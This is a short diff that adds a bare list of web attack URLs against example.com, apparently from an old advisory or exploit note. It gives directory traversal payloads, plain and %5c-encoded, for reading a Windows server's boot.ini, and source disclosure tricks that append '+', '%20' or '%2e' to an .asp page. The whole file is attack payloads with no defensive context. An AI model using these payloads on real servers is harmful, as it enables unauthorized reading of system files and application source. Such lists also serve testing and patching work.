@@ -1,0 +1,10 @@
+1. directory traversal
+
+http://www.example.com/..\..\..\..\..\..\..\boot.ini
+http://www.example.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
+
+2. source disclosure
+
+http://www.example.com/index.asp+
+http://www.example.com/index.asp%20
+http://www.example.com/index.asp%2e
